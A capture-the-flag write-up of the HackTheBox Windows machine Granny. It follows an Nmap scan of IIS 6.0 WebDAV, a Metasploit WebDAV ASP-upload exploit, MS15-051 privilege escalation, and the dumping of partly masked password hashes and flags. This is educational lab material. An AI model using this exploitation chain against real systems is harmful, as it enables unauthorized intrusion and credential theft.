---
lang: "en"
classoption: oneside
code-block-font-size: \scriptsize
geometry: "a4paper"
geometry: "margin=2cm"
header-includes:
  - \usepackage{float}
  - \floatplacement{figure}{H}
  - \usepackage{xcolor}
  - \hypersetup{breaklinks=true,
                bookmarks=true,
                pdftitle="Granny",
                pdfauthor="svachal (@7h3rAm)",
                pdfsubject='Writeup for HackTheBox VM Granny',
                pdfkeywords="oscp htb windows",
                colorlinks=true,
                linkcolor=cyan,
                urlcolor=blue}
  - \usepackage{fvextra}
  - \DefineVerbatimEnvironment{Highlighting}{Verbatim}{breaklines,breakanywhere=true,commandchars=\\\{\}}
  - \usepackage{mathtools}
---

# [[HackTheBox] Granny](https://www.hackthebox.eu/home/machines/profile/14)

**Date**: 04/Nov/2019  
**Categories**: [oscp](https://github.com/7h3rAm/writeups/search?q=oscp&unscoped_q=oscp), [htb](https://github.com/7h3rAm/writeups/search?q=htb&unscoped_q=htb), [windows](https://github.com/7h3rAm/writeups/search?q=windows&unscoped_q=windows)  
**Tags**: [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051)  
**InfoCard**:  
![writeup.metadata.infocard](./infocard.png)

## Overview
This is a writeup for HackTheBox VM [Granny](https://www.hackthebox.eu/home/machines/profile/14). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:


![writeup.overview.killchain](./killchain.png)


\newpage
## Phase #1: Enumeration
1\. Here's the Nmap scan result:  
``` {.python .numberLines}
# Nmap 7.70 scan initiated Mon Nov  4 13:35:36 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.granny/results/10.10.10.15/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.granny/results/10.10.10.15/scans/xml/_quick_tcp_nmap.xml 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.051s latency).
Scanned at 2019-11-04 13:35:37 PST for 21s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Mon, 04 Nov 2019 21:36:04 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  4 13:35:58 2019 -- 1 IP address (1 host up) scanned in 21.97 seconds

```

2\. We look for IIS 6.0 vulnerabilities and find multiple WebDAV related hits:  

![writeup.enumeration.steps.2.1](./screenshot01.png)  


### Findings
#### Open Ports
``` {.python .numberLines}
80/tcp  |  http  |  Microsoft IIS httpd 6.0
```

\newpage
## Phase #2: Exploitation
1\. We decide to use the Metasploit `windows/iis/iis_webdav_upload_asp` exploit and it successully gives us a Meterpreter shell:  

![writeup.exploitation.steps.1.1](./screenshot02.png)  

![writeup.exploitation.steps.1.2](./screenshot03.png)  


## Phase #2.5: Post Exploitation
``` {.python .numberLines}
ntauth/network@GRANNY> id
NT AUTHORITY\NETWORK SERVICE
ntauth/network@GRANNY>  
ntauth/network@GRANNY> uname
Computer        : GRANNY
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
ntauth/network@GRANNY>  
ntauth/network@GRANNY> ifconfig
Ethernet adapter Local Area Connection:
 Connection-specific DNS Suffix  . :
 IP Address. . . . . . . . . . . . : 10.10.10.15
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.10.10.2
ntauth/network@GRANNY>  
ntauth/network@GRANNY> users
Administrator
Lakis
```

\newpage
## Phase #3: Privilege Escalation
1\. Since we have certain restrictions that stop us from running commands like `getuid`, we have to migrate to a different process. We find the PID for process `davcdata.exe` and migrate to it:  

![writeup.privesc.steps.1.1](./screenshot04.png)  

2\. We can now use the Metasploit `multi/recon/local_exploit_suggester` module to look for privesc options:  

![writeup.privesc.steps.2.1](./screenshot05.png)  

3\. We tried a few exploits from this list and eventually the `windows/local/ms15_051_client_copy_image` module worked and provided an elevated session:  

![writeup.privesc.steps.3.1](./screenshot06.png)  

![writeup.privesc.steps.3.2](./screenshot07.png)  

4\. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  
``` {.python .numberLines}
cat "C:\Documents and Settings\Lakis\Desktop\user.txt"
cat "C:\Documents and Settings\Administrator\Desktop\root.txt"

```

![writeup.privesc.steps.4.1](./screenshot08.png)  


\newpage

## Loot
### Hashes
``` {.python .numberLines}
Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e.................
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f589................
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c...............
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b7.................
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f615.................
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6................
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e..................
```
### Flags
``` {.python .numberLines}
C:\Documents and Settings\Lakis\Desktop\user.txt: 700c5dc163014e22................
C:\Documents and Settings\Administrator\Desktop\root.txt: aa4beed1c05844..................
```

## References
[+] <https://www.hackthebox.eu/home/machines/profile/14>  
[+] <https://marcelowoloszyn.cl/hackthebox/hack-the-box-write-up-granny/>  
[+] <https://reboare.github.io/hackthebox/htb-granny.html>  
